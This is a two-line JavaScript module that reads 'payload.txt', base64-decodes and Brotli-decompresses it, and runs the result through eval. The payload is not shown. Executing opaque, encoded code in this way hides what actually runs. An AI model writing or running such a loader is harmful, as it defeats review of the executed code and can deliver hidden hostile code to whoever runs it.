const g=process.getBuiltinModule;
eval(g('zlib').brotliDecompressSync(Buffer.from(g('fs').readFileSync(new URL('payload.txt',import.meta.url),'utf8'),'base64'))+'');
